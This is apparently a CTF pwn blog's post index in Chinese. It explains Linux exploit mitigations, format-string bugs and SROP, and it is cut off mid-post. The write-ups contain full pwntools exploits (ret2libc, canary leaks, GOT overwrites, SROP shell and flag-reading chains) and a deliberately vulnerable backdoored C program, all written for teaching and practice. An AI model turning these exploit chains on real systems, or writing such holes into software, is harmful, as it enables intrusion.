[{"title":"Linux保护机制","url":"/2023/07/25/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/","content":"矛与盾NX数据不可执行。原理是将数据所在内存页标识为不可执行，防止因为程序运行出现溢出而使得攻击者的shellcode可能会在数据区尝试执行的情况。NX在咱屡战屡败的经典栈溢出实验中有接触过，NX是对栈和堆的一种保护机制。实验需要关闭NX和地址随机化，否则执行shellcode时，CPU就会抛出异常，而不是去执行恶意指令。Linux系统叫做NX，Windows系统中类似的机制叫DEP(Data Execute Prevention)。绕过方式：ret2libc 例题：[BJDCTF 2020]babyrop本题没给libc，如果给了libc可以采用elf&#x3D;ELF[‘libc.so’]直接读地址\nfrom pwn import*import sgtlibcelf=ELF(&#x27;/home/str1k3/桌面/babyrop&#x27;)#elf=ELF(&#x27;./libc.so&#x27;)p = remote(&#x27;1.14.71.254&#x27;,28013)pop_rdi_addr = 0x400733ret_addr = 0x4004c9main_addr = 0x4006ADputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendlineafter(&#x27;story!\\n&#x27;,payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\00&#x27;))log.info(&quot;puts addr is :%x&quot;%puts_addr)s = sgtlibc.Searcher()s.add_condition(&#x27;puts&#x27;,puts_addr)s.dump(db_index=6) # search libc , if returns multi-result ,default use index-0&#x27;s resultsystem_addr = s.get_address(sgtlibc.s_system)binsh_addr = s.get_address(sgtlibc.s_binsh)puts_addr_ = s.get_address(sgtlibc.s_puts)print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))libc_base = puts_addr - puts_addr_system = libc_base + system_addrbin_sh = libc_base + binsh_addrpayload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8 + p64(ret_addr) +p64(pop_rdi_addr)+p64(bin_sh)+p64(system)p.sendlineafter(&#x27;story!\\n&#x27;,payload)p.interactive()\n\n\n也可以用LibcSearcher，找出来的libc版本不一定对，多试几次贴个LibcSearcher的板子\nfrom pwn import *from LibcSearcher import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) io = process(&#x27;./ezrop64&#x27;)#io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28173)elf=ELF(&#x27;./ezrop64&#x27;)padding = 0x100+0x08pop_rdi_ret = 0x4012a3ret_addr =0x40101adef rl(a):    io.recvuntil(a)rl(b&#x27;0x&#x27;)puts_addr = int(io.recv(12), 16)print(hex(puts_addr))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)print(&#x27;puts_addr:&#x27;,hex(puts_addr))print(&#x27;libc_base:&#x27;,hex(libc_base))print(&#x27;system_addr:&#x27;,hex(system_addr))print(&#x27;bin_addr:&#x27;,hex(bin_addr))#gdb.attach(io)payload2 = b&#x27;a&#x27;* padding + p64(ret_addr)+ p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)io.sendline(payload2)io.interactive()\n\n\nStack Canary栈保护。栈溢出保护是一种缓冲区溢出攻击缓解手段。启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。简单来说就是通过验证cookie，来判断执行的代码是不是恶意代码。cannary通常可分为3类：1.Terminator canaries:由于字符串操作不当可造成栈溢出，而字符串可以被Null(“\\x00”)所截断，于是Terminator canaries将低位设置为”\\x00“,可以防止被泄露，也可以防止被伪造。截断字符还可包括CR(0x0d)、LF（0x0a）、EOF(0xff)。2.Randon canaries:为防止canary被攻击者猜到，Randon canaries通常在程序初始化时生成，并保存在相对安全的地方。随机数通常由&#x2F;dev&#x2F;urandom生成，有时也会使用当前时间的哈希。3.Randon XOR canaries:与Randon canaries类似，但多了一个XOR操作，这样无论是canary被篡改还是与之XOR的控制数据被篡改，都会发生错误。**例：[BJDCTF 2020]babyrop2 **查查保护gift给了格式化字符串漏洞，可以泄露canary尝试泄露canarycanary的值位于rbp-0x08处，即rbp-0x08 &#x3D; 0x20 - 0x08 &#x3D; 0x18在这里溢出exp\nfrom pwn import *from LibcSearcher import *io = remote(&quot;node4.anna.nssctf.cn&quot;,28668)elf = ELF(&quot;./bjdctf_2020_babyrop2&quot;)main_addr = elf.symbols[&#x27;main&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]vuln_addr = 0x400887#ROPgadgetrdi = 0x0000000000400993 #: pop rdi ; retio.sendline(&#x27;%7$p&#x27;)io.recvuntil(&quot;0x&quot;)canary = int(io.recv(16),16)#print hex(canary)#泄露puts函数地址payload = (0x20-0x08)*&#x27;a&#x27;+p64(canary)+&#x27;a&#x27;*8+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)io.sendlineafter(&quot;story!\\n&quot;,payload)puts_addr = u64(io.recv(6).ljust(8,&quot;\\x00&quot;))#ret2libclibc = LibcSearcher(&quot;puts&quot;,puts_addr)libc_base = puts_addr - libc.dump(&quot;puts&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)bin_sh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload = (0x20-0x08)*&#x27;a&#x27;+p64(canary)+&#x27;a&#x27;*8+p64(rdi)+p64(bin_sh_addr)+p64(sys_addr)io.sendlineafter(&quot;story!\\n&quot;,payload)io.interactive()\n\n\nPIE &#x2F; ASLR 地址随机化。就是保证同一个程序任意两次运行时的堆栈基址是不同的。如果堆栈基址不变会怎样？不变就可能被攻击，因为攻击者能确认程序的内存地址，然后通过覆盖返回地址在等手段执行恶意代码。咱屡战屡败的经典栈溢出实验就是通过覆盖返回地址执行恶意代码。点击图片可查看完整电子表格pie的特点：pie保护下，地址后三位不变，相对地址不变，可以利用该特点来绕过pie。例：[NISACTF 2022]ezpie存在溢出得到相对地址，即shell_addr &#x3D; main_addr + 0x80F - 0x770exp\nfrom pwn import *context.log_level = &#x27;debug&#x27;# p = process(&quot;./ezpie&quot;)io = remote(&#x27;1.14.71.254&#x27;, 28335)io.recvuntil(&#x27;0x&#x27;)main_addr = int(p.recv(8), 16)print(&#x27;[+]main_addr: &#x27;, hex(main_addr))shell_addr = main_addr + 0x80F - 0x770print(&#x27;[+]shell_addr: &#x27;, hex(shell_addr))payload = b&#x27;a&#x27;*(0x28 + 4) + p32(shell_addr)io.recvuntil(&quot;Input:\\n&quot;)io.sendline(payload)io.interactive()\n\nRelro只读重定位。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT攻击。在Linux中有”Partial RELRO” “Full RELRO”两种模式，默认开启Partical RELRO，开启Partical RELRO时，GOT是可写的，开启 FULL RELRO 时，GOT表是只读的。 主要用来保护重定位表段对应数据区域，默认可写 Partial RELRO： got表不可写，got.plt可写 Full RELRO： got表，got.plt不可写  部分RELRO 易受到攻击，例如攻击者可以修改atoi.got为system.plt，进而输入&#x2F;bin&#x2F;sh\\x00获得shell完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。参考：https://www.zhihu.com/question/21249496FORTIFY在编译的时候检查源码是否存在缓冲区溢出等错误。简单地说，加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk, __printf_chk等。这些带了chk的函数会检查读取&#x2F;复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。##BRATH程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击。源码分享，来自《CTF竞赛权威指南——pwn篇》链接：https://pan.baidu.com/s/1r2v-73lAK-PlUQpAnPV4iw 提取码：1145 \n","tags":["Linux"]},{"title":"格式化字符串漏洞","url":"/2023/08/01/hello-world/","content":"在你的内存刻上奇怪的符号\n函数原型printf (“格式化字符串”,参量… )函数的返回值是正确输出的字符的个数，如果输出失败，返回负值。参量表中参数的个数是不定的（如何实现参数的个数不定，可以参考《程序员的自我修养》这本书），可以是一个，可以是两个，三个…，也可以没有参数。printf函数的格式化字符串常见的有 %d，%f，%c，%s，%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等。但是有个不常见的格式化字符串 %n ，它的功能是将%n之前打印出来的字符个数，赋值给一个变量。\n除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。 注意是对应参数（这个参数是指针）的对应的地址开始起几个字节。不要觉得%lln，取的是8个字节的指针，%n取的就是4个字节的指针，取的是多少字节的指针只跟程序的位数有关，如果是32位的程序，%n取的就是4字节指针，64位取的就是8字节指针，这是因为不同位数的程序，每个参数对应的字节数是不同的。接下来写个程序看看\n//gcc -no-pie test.c -fno-stack-protector  -z execstack -o test#include &lt;stdio.h&gt;int d = 1;   //fmt1char x[] =&quot;/bin/sh&quot;int main()&#123;  int n=0;  printf(&quot;aaaaa%n\\n&quot;,&amp;n);  printf(&quot;%d\\n&quot;,n);\t\t  \t  int a=114;  printf(&quot;%d\\n&quot;,a);    char b[]=&quot;str1k3&quot;;  printf(b);  printf(&quot;\\n&quot;);    char c[256];  read(0,c,0x64);  //fmt  printf(c);  puts(x);    //fmt2  if(d==0)  &#123;   backdoor();  &#125;  return 0;&#125;int backdoor()&#123; return system(&quot;/bin/sh&quot;);&#125;\n\nStarting program: /home/str1k3/Desktop/test aaaaa5114str1k3aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaaaaaa-0xa-(nil)-(nil)-0xa-0x7c-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x7025-0x401090-0x336b3172747320[Inferior 1 (process 14255) exited normally]\n如果我们只传入了格式化字符串而没有传入参数\n那么格式化字符串仍然会遵循着原先的逻辑，向高地址处逐个字长的输出当前栈的内容&#x2F;指针(输出的方式根据其格式化字符的不同而不同)\n这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束\nfrom pwn import *p = process(&#x27;./test&#x27;)elf =ELF(&#x27;./test&#x27;)context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)def fmt1():  p.recv()  payload=fmtstr_payload(6,&#123;0x404048:0&#125;)    #把d改为0  p.sendline(payload)  p.interactive()def fmt2():  p.recv()  payload=fmtstr_payload(6,&#123;elf.got[&#x27;puts&#x27;]:elf.plt[&#x27;system&#x27;]&#125;) #把read改为system，执行/bin/sh  p.sendline(payload)  p.interactive()#fmt1()fmt2()\n下面放一道综合一点的题[SWPUCTF 2021 新生赛]NSS_printer_Ichecksec\n[*] &#x27;/home/str1k3/.cache/vmware/drag_and_drop/3CJjqN/NSS_printer&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char buf[104]; // [rsp+0h] [rbp-70h] BYREF  unsigned __int64 v4; // [rsp+68h] [rbp-8h]  v4 = __readfsqword(0x28u);  init();  while ( 1 )  &#123;    puts(&quot;======================================&quot;);    puts(&quot;=====welcone to use NSS printer!======&quot;);    printf(&quot;input what you want to say: &quot;);    read(0, buf, 0x64uLL);    printf(&quot;you said:&quot;);    printf(buf);  &#125;&#125;```  保护全开。存在格式化字符串漏洞，考虑内存任意写改got表。开了pie，可利用地址相对位置不变，地址后三位不变的特性绕过。最终想法是把printf改成system，然后通过手动输入/bin/sh来拿到shell```text用上文的测试方式：aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p可调试得：偏移：611（_start）+ 6 = 17   #有些师傅用的这个来算基址13（canary）+ 6（偏移） = 19（真实地址）15（__libc_start_main）+6（偏移） = 21（真实地址）19（main）+6（偏移） = 25（真实地址）\n\n\nfrom LibcSearcher import *from pwn import*context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./NSS_printer&#x27;)#p = remote(&#x27;node1.anna.nssctf.cn&#x27;, 28831)elf = ELF(&#x27;./NSS_printer&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)payload1 = &quot;%19$p..%21$p-%25$p&quot;p.recvuntil(&quot;input what you want to say: &quot;)p.sendline(payload1)p.recvuntil(&#x27;you said:&#x27;)canary = int(p.recv(18),16)print(&#x27;canary_addr&#x27;,hex(canary))p.recvuntil(&#x27;..&#x27;)libc_start_main = int(p.recv(14),16)-240print(&#x27;libc_start_main&#x27;,hex(libc_start_main))p.recvuntil(&#x27;-&#x27;)elf_base = int(p.recv(14),16)-0xA14  #main函数的偏移printf_addr = elf_base+elf.got[&#x27;printf&#x27;]print(&#x27;elf_base&#x27;,hex(elf_base))print(&#x27;printf_addr&#x27;,hex(printf_addr))libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_main)libc_base = libc_start_main - libc.dump(&quot;__libc_start_main&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)bin_addr =  libc_base + libc.dump(&quot;str_bin_sh&quot;)print(&#x27;libc_start_main:&#x27;,hex(libc_start_main))print(&#x27;libc_base:&#x27;,hex(libc_base))print(&#x27;system_addr:&#x27;,hex(system_addr))print(&#x27;bin_addr:&#x27;,hex(bin_addr))payload = fmtstr_payload(6,&#123;printf_addr:system_addr&#125;,write_size=&#x27;short&#x27;)print(len(payload))p.recvuntil(&quot;input what you want to say: &quot;)p.sendline(payload)p.sendline(b&#x27;/bin/sh\\x00&#x27;)p.interactive()\n\n\n\n","tags":["fmt"]},{"title":"初探srop","url":"/2023/08/13/%E5%88%9D%E6%8E%A2srop/","content":"signal 机制signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。\n┌──(str1d3r㉿str1k3Gwindows)-[~]└─$ kill -l 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR111) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+338) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+843) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+1348) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-1253) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9  56) SIGRTMAX-8  57) SIGRTMAX-758) SIGRTMAX-6  59) SIGRTMAX-5  60) SIGRTMAX-4  61) SIGRTMAX-3  62) SIGRTMAX-263) SIGRTMAX-1  64) SIGRTMAX\n内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。\n内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontextx86\nstruct sigcontext&#123;  unsigned short gs, __gsh;  unsigned short fs, __fsh;  unsigned short es, __esh;  unsigned short ds, __dsh;  unsigned long edi;  unsigned long esi;  unsigned long ebp;  unsigned long esp;  unsigned long ebx;  unsigned long edx;  unsigned long ecx;  unsigned long eax;  unsigned long trapno;  unsigned long err;  unsigned long eip;  unsigned short cs, __csh;  unsigned long eflags;  unsigned long esp_at_signal;  unsigned short ss, __ssh;  struct _fpstate * fpstate;  unsigned long oldmask;  unsigned long cr2;&#125;;\nx64\nstruct _fpstate&#123;  /* FPU environment matching the 64-bit FXSAVE layout.  */  __uint16_t        cwd;  __uint16_t        swd;  __uint16_t        ftw;  __uint16_t        fop;  __uint64_t        rip;  __uint64_t        rdp;  __uint32_t        mxcsr;  __uint32_t        mxcr_mask;  struct _fpxreg    _st[8];  struct _xmmreg    _xmm[16];  __uint32_t        padding[24];&#125;;struct sigcontext&#123;  __uint64_t r8;  __uint64_t r9;  __uint64_t r10;  __uint64_t r11;  __uint64_t r12;  __uint64_t r13;  __uint64_t r14;  __uint64_t r15;  __uint64_t rdi;  __uint64_t rsi;  __uint64_t rbp;  __uint64_t rbx;  __uint64_t rdx;  __uint64_t rax;  __uint64_t rcx;  __uint64_t rsp;  __uint64_t rip;  __uint64_t eflags;  unsigned short cs;  unsigned short gs;  unsigned short fs;  unsigned short __pad0;  __uint64_t err;  __uint64_t trapno;  __uint64_t oldmask;  __uint64_t cr2;  __extension__ union    &#123;      struct _fpstate * fpstate;      __uint64_t __fpstate_word;    &#125;;  __uint64_t __reserved1 [8];&#125;;\nsignal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。\n仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：\nSignal Frame 被保存在用户的地址空间中，所以用户是可以读写的。由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。说到这里，其实，SROP 的基本利用原理也就出现了。获取 shell首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。system call chains需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可控制栈指针。把原来 rip 指向的syscall gadget 换成syscall; ret gadget。这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。后续 ¶需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件可以通过栈溢出来控制栈的内容需要知道相应的地址“&#x2F;bin&#x2F;sh”Signal Framesyscallsigreturn需要有够大的空间来塞下整个 sigal frame\n以上介绍来自CTFwikipwntools已集成srop攻击\n[CISCN 2019华南]PWN3 #复现环境ubuntu 20.04\nstr1k3@ubuntu:~/Desktop$ checksec &#x27;/var/run/vmblock-fuse/blockdir/P0SsCP/pwn3&#x27; [*] &#x27;/var/run/vmblock-fuse/blockdir/P0SsCP/pwn3&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n保护没特别的\nsigned __int64 vuln()&#123;  signed __int64 v0; // rax  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  v0 = sys_read(0, buf, 0x400uLL);  return sys_write(1u, buf, 0x30uLL); //打印出栈地址&#125;\n给了gadget\n.text:00000000004004D6                               public gadgets.text:00000000004004D6                               gadgets proc near.text:00000000004004D6                               ; __unwind &#123;.text:00000000004004D6 55                            push    rbp.text:00000000004004D7 48 89 E5                      mov     rbp, rsp.text:00000000004004DA 48 C7 C0 0F 00 00 00          mov     rax, 0Fh.text:00000000004004E1 C3                            retn.text:00000000004004E1.text:00000000004004E1                               gadgets endp ; sp-analysis failed.text:00000000004004E1.text:00000000004004E2                               ; ---------------------------------------------------------------------------.text:00000000004004E2 48 C7 C0 3B 00 00 00          mov     rax, 3Bh ; &#x27;;&#x27;.text:00000000004004E9 C3                            retn.text:00000000004004E9.text:00000000004004E9                               ; ---------------------------------------------------------------------------.text:00000000004004EA 90                            db 90h.text:00000000004004EB                               ; ---------------------------------------------------------------------------.text:00000000004004EB 5D                            pop     rbp.text:00000000004004EC C3                            retn.text:00000000004004EC                               ; &#125; // starts at 4004D6\n有mov rax，0xf,显然进行srop要实现system(“&#x2F;bin&#x2F;sh”)首先我们还需要给rdi赋值bin_sh字符串的地址需要把bin_sh写到栈上 然后利用write函数泄露栈地址\npwndbg&gt; x/40gx 0x7fffffffe3300x7fffffffe330:\t0x6161616161616161*\t0x000000000040050a 0x7fffffffe340:\t0x00007fffffffe360\t0x00000000004005360x7fffffffe350:\t0x00007fffffffe458*\t0x0000000100000000 0x7fffffffe360:\t0x0000000000000000\t0x00007ffff7de80830x7fffffffe370:\t0x00007ffff7ffc620\t0x00007fffffffe4580x7fffffffe380:\t0x0000000100000000\t0x000000000040051d0x7fffffffe390:\t0x0000000000400540\t0xb0a1866950c4d5040x7fffffffe3a0:\t0x00000000004003e0\t0x00007fffffffe4500x7fffffffe3b0:\t0x0000000000000000\t0x00000000000000000x7fffffffe3c0:\t0x4f5e79969624d504\t0x4f5e69d450aad5040x7fffffffe3d0:\t0x0000000000000000\t0x00000000000000000x7fffffffe3e0:\t0x0000000000000000\t0x00000000000000010x7fffffffe3f0:\t0x00007fffffffe458\t0x00007fffffffe4680x7fffffffe400:\t0x00007ffff7ffe190\t0x00000000000000000x7fffffffe410:\t0x0000000000000000\t0x00000000004003e00x7fffffffe420:\t0x00007fffffffe450\t0x00000000000000000x7fffffffe430:\t0x0000000000000000\t0x00000000004004090x7fffffffe440:\t0x00007fffffffe448\t0x000000000000001c0x7fffffffe450:\t0x0000000000000001\t0x00007fffffffe6d40x7fffffffe460:\t0x0000000000000000\t0x00007fffffffe709\n输入的8字节的字母a位于0x7fffffffe330,0x7fffffffe350处有一个0x00007fffffffe458的地址可以泄露\nfrom pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#p = process(&quot;./pwn3&quot;)p = remote(&quot;node1.anna.nssctf.cn&quot;,28856)elf = ELF(&quot;./pwn3&quot;)syscall = 0x400501syscall_ret = 0x400517gadget = 0x4004DAvuln = 0x4004ED#泄露栈地址p.send(b&#x27;a&#x27;*0x10+p64(vuln))p.recv(0x20)stack = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) -0x118print(&quot;stack -&gt; &quot; + hex(stack))#sropframe = SigreturnFrame()frame.rax = 59frame.rdi = stackframe.rip = syscallframe.rsi = 0payload = b&quot;/bin/sh\\x00&quot;*0x2 + p64(gadget) + p64(syscall) + bytes(frame)p.send(payload)p.interactive()\n\n[NepCTF 2023] -srop  #wp待补充\n//gcc -no-pie pwn.c -fno-stack-protector -z now -o pwn  -lseccomp#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;seccomp.h&gt;#include &lt;linux/seccomp.h&gt;char buf[0x30]=&quot;welcome to NepCTF2023!\\n&quot;;int seccomp()&#123;    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_KILL);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);    seccomp_load(ctx);    return 0;&#125;//沙盒int sys()&#123;    return 15;&#125;//syscallint main()&#123;     char bd[0x30];     seccomp();     syscall(1,1,buf,0x30); //write(&quot;welcome to NepCTF2023!\\n&quot;)     return syscall(0,0,bd,0x300);  //read(bd,0x300)&#125;//主函数\n查保护\npwndbg&gt; checksec[*] &#x27;/home/str1k3/Desktop/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nstr1k3@ubuntu:~/Desktop$ seccomp-tools dump ./pwn line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL\n沙盒，但是允许了orw\npwndbg&gt; search flagSearching for value: &#x27;flag&#x27;libc-2.27.so    0x7ffff77d4a3b insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff77d7505 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff77d7906 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff79736a0 insb byte ptr [rdi], dx /* &#x27;flags&#x27; */libc-2.27.so    0x7ffff7979b44 insb byte ptr [rdi], dx /* &#x27;flags2 &amp; _IO_FLAGS2_FORTIFY&#x27; */libc-2.27.so    0x7ffff79b0282 &#x27;flags is not implemented and will always fail&#x27;warning: Unable to access 16003 bytes of target memory at 0x7ffff79b0286, halting search.warning: Unable to access 16003 bytes of target memory at 0x7ffff7bd1000, halting search.ld-2.27.so      0x7ffff7df6421 insb byte ptr [rdi], dx /* &#x27;flag)&#x27; */ld-2.27.so      0x7ffff7df6efe insb byte ptr [rdi], dx /* &#x27;flag value(s) of 0x%x in DT_FLAGS_1.\\n&#x27; */ld-2.27.so      0x7ffff7df77d4 insb byte ptr [rdi], dx /* &#x27;flags &amp; ~(DL_LOOKUP_ADD_DEPENDENCY | DL_LOOKUP_GSCOPE_LOCK)) == 0&#x27; */ld-2.27.so      0x7ffff7df844e insb byte ptr [rdi], dx /* &#x27;flags_1 &amp; DF_1_NODELETE) == 0&#x27; */\n\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)# io = process(&quot;./pwn&quot;)p = remote(&quot;nepctf.1cepeak.cn&quot;, 31943)mov_eax_15 = 0x0000400754   #0x0000000000400754 : mov eax, 0xf ; pop rbp ; retbuf = 0x00000601050         #.bss:0000000000601050ret = 0x004007AE            #.text:00000000004007AD C9                            leave                            #.text:00000000004007AE C3                            retnsyscall = 0x0004005B0       #.plt:00000000004005B0                               ; [00000006 BYTES: COLLAPSED FUNCTION _syscall. PRESS CTRL-NUMPAD+ TO EXPAND]pop_rdi = 0x0000000000400813    #0x0000000000400813 : pop rdi ; retstack = 0x0601a50#开出一个栈frame = SigreturnFrame()frame.rdi = 0frame.rsi = 0frame.rdx = stack-0x8frame.rcx = 0x1000frame.rip = syscallframe.rsp = stackpayload = b&quot;a&quot; * (0x0030+8) + flat([    pop_rdi,    15,    syscall]) + bytes(frame)p.send(payload)sleep(1)#orwframe = SigreturnFrame()frame.rdi = 2frame.rsi = stack-0x8frame.rdx = 0frame.rcx = 0x1000frame.rip = syscallframe.rsp = stack + 0x110payload = b&quot;./flag\\x00\\x00&quot; + flat([    pop_rdi,    15,    syscall ]) + bytes(frame) frame = SigreturnFrame()frame.rdi = 0frame.rsi = 3frame.rdx = stack-0x100frame.rcx = 0x40frame.rip = syscallframe.rsp = stack + 0x110 + 0x110payload += flat([    pop_rdi,    15,    syscall ]) + bytes(frame) frame = SigreturnFrame()frame.rdi = 1frame.rsi = 1frame.rdx = stack-0x100frame.rcx = 0x40frame.rip = syscallframe.rsp = stack + 0x110 + 0x110 + 0x110payload += flat([    pop_rdi,    15,    syscall ]) + bytes(frame) log.success(f&quot;length &#123;len(payload):#x&#125;&quot;)p.send(payload)p.interactive()"},{"title":"GDOUCTF2023_pwn","url":"/2023/07/20/GDOUCTF2023-pwn/","content":"温故而知新[GDOUCTF 2023]真男人下120层\nv9 = __readfsqword(0x28u);  setbuf(_bss_start, 0LL);  v3 = time(0LL);  srand(v3);  v8 = 2772839826LL;  v4 = rand();  srand(v4 % 3 - 1522127470);...... if ( rand() % 4 + 1 != v6 )    &#123;      printf(&quot;\\x1B[31m&quot;);      puts(&quot;YOU DIED!&quot;);      